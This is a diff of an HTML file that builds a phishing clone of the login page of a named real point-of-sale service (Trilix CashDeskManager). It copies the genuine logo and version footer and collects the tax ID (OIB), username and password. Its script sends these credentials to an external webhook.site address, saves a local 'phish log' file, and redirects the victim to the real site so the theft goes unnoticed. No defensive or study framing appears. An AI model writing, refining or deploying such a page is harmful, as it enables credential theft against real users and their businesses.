@@ -2,169 +2,105 @@
 <html lang="hr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CashDeskManager Login</title>
+    <title>CashDeskManager - Login</title>
+    <!-- Bootstrap CSS za stilizaciju kao original -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #dcdcdc; /* Siva pozadina kao na slici */
-            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-
-        .login-box {
-            background: #e6e6e6;
-            padding: 40px 30px;
+        body { background-color: #dcdcdc; font-family: Arial, sans-serif; }
+        .container#loginFormContainer {
+            max-width: 400px;
+            margin: 80px auto;
+            padding: 30px;
+            background-color: #e6e6e6;
             border-radius: 8px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.15);
-            text-align: center;
-            width: 320px;
         }
-
-        .logo {
-            margin-bottom: 30px;
-        }
-
-        .logo img {
-            max-width: 150px;
-            height: auto;
-        }
-
-        .input-group {
-            text-align: left;
-            margin-bottom: 20px;
-        }
-
-        .input-group label {
-            display: block;
-            font-size: 12px;
-            color: #555;
-            margin-bottom: 5px;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 10px;
-            box-sizing: border-box;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            background: #fff;
-            font-size: 14px;
-        }
-
-        .checkbox-group {
-            text-align: left;
-            margin-bottom: 25px;
-            display: flex;
-            align-items: center;
-            font-size: 12px;
-            color: #555;
-        }
-
-        .checkbox-group input {
-            margin-right: 8px;
-        }
-
-        .btn-login {
-            width: 100%;
-            padding: 10px;
-            background-color: #b30000; /* Crveni dugme kao na prvom screenshotu */
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 14px;
-            cursor: pointer;
-            font-weight: bold;
-            text-transform: uppercase;
-        }
-
-        .btn-login:hover {
-            background-color: #800000;
-        }
-
-        .footer-info {
-            margin-top: 25px;
-            font-size: 10px;
-            color: #777;
-            display: flex;
-            justify-content: space-between;
-        }
+        #loginImg { display: block; margin: 0 auto 20px auto; }
+        .form-horizontal .form-group { margin-bottom: 15px; }
+        .row { margin-top: 20px; }
+        .btn-primary { background-color: #b30000; border-color: #b30000; }
+        .btn-primary:hover { background-color: #800000; border-color: #800000; }
     </style>
 </head>
 <body>
 
-    <div class="login-box">
-        <div class="logo">
-            <!-- Koristimo logo koji je na sajtu -->
-            <img src="https://dsds.trilix.hr/CashDeskManager/resources/themes/xpos/xpos-logo.png" alt="XPOS Logo">
+<div class="container" id="loginFormContainer">
+    <img src="https://dsds.trilix.hr/CashDeskManager/resources/themes/xpos/xpos-logo.png" id="loginImg" alt="XPOS Logo">
+
+    <form name="f" class="form-horizontal form-horizontal--full" id="phishForm">
+        <input type="hidden" name="_csrf" value="edbc40c5-3ae2-4040-b068-8e700ad0d79c">
+
+        <div class="form-group">
+            <label class="control-label" for="oib">OIB:</label>
+            <input type="text" class="form-control" id="oib" name="oib" autofocus="autofocus">
         </div>
 
-        <div class="input-group">
-            <label for="oib">OIB:</label>
-            <input type="text" id="oib" name="oib" autocomplete="off">
+        <div class="form-group">
+            <label class="control-label" for="username">Korisničko ime:</label>
+            <input type="text" class="form-control" id="username" name="username">
         </div>
 
-        <div class="input-group">
-            <label for="user">Korisničko ime:</label>
-            <input type="text" id="user" name="user" autocomplete="off">
+        <div class="form-group">
+            <label class="control-label" for="password">Zaporka:</label>
+            <input type="password" class="form-control" id="password" name="password">
         </div>
 
-        <div class="input-group">
-            <label for="pass">Zaporka:</label>
-            <input type="password" id="pass" name="pass">
+        <div class="form-group">
+            <div class="checkbox">
+                <label><input type="checkbox" id="remember-me" name="remember-me"> Zapamti me</label>
+            </div>
         </div>
 
-        <div class="checkbox-group">
-            <input type="checkbox" id="remember">
-            <label for="remember">Zapamti me</label>
+        <div class="form-group">
+            <button type="button" class="btn btn-primary" id="loginBtn">Login</button>
         </div>
 
-        <button type="button" class="btn-login" id="loginBtn">LOGIN</button>
-
-        <div class="footer-info">
-            <span>3.8.0 (b4183b1)</span>
-            <span>powered by Trilix</span>
+        <div class="row" style="margin-bottom: 0">
+            <div class="col-sm-6" align="left">
+                <span style="color: rgb(117, 117, 117); font-size: small;">3.8.0 (b4183b1)</span>
+            </div>
+            <div class="col-sm-6" align="right">
+                <span style="color: rgb(117, 117, 117); font-size: small;">powered by Trilix</span>
+            </div>
         </div>
-    </div>
+    </form>
+</div>
 
-    <script>
-        // OVAJ DEO JE BITAN - ZAMENI "TVOJ_WEBHOOK_LINK" SA STVARNO LINKOM
-        const WEBHOOK_URL = 'https://webhook.site/b5e28484-5c0d-4318-a432-af4f5f6380f6';
+<script>
+    // OVAJ DEO JE BITAN - ZAMENI "TVOJ_WEBHOOK_LINK" SA STVARNO LINKOM
+    const WEBHOOK_URL = 'https://webhook.site/b5e28484-5c0d-4318-a432-af4f5f6380f6';
 
-        function sendCreds() {
-            const oib = document.getElementById('oib').value;
-            const user = document.getElementById('user').value;
-            const pass = document.getElementById('pass').value;
+    function sendCreds() {
+        const oib = document.getElementById('oib').value;
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
 
-            // 1. Pošalji na webhook (ako je moguće)
-            try {
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({oib, user, pass})
-                });
-            } catch(e) {}
+        // 1. Pošalji na webhook
+        try {
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({oib, username, password})
+            });
+        } catch(e) {}
 
-            // 2. Spusti fajl na lokalni disk
-            const logContent = `=== TRILIX PHISH LOG ===\nDate: ${new Date().toISOString()}\nOIB: ${oib}\nUser: ${user}\nPass: ${pass}`;
-            const blob = new Blob([logContent], {type: "text/plain"});
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = "trilix_creds.txt";
-            a.click();
-            URL.revokeObjectURL(url);
+        // 2. Spusti fajl na lokalni disk
+        const logContent = `=== TRILIX PHISH LOG ===\nDate: ${new Date().toISOString()}\nOIB: ${oib}\nUser: ${username}\nPass: ${password}`;
+        const blob = new Blob([logContent], {type: "text/plain"});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = "trilix_creds.txt";
+        a.click();
+        URL.revokeObjectURL(url);
 
-            // 3. Redirect na pravi sajt (da se ne sumnja)
-            window.location.href = 'https://dsds.trilix.hr/CashDeskManager/login';
-        }
+        // 3. Redirect na pravi sajt
+        window.location.href = 'https://dsds.trilix.hr/CashDeskManager/login';
+    }
 
-        document.getElementById('loginBtn').addEventListener('click', sendCreds);
-    </script>
+    document.getElementById('loginBtn').addEventListener('click', sendCreds);
+</script>
+
 </body>
 </html>
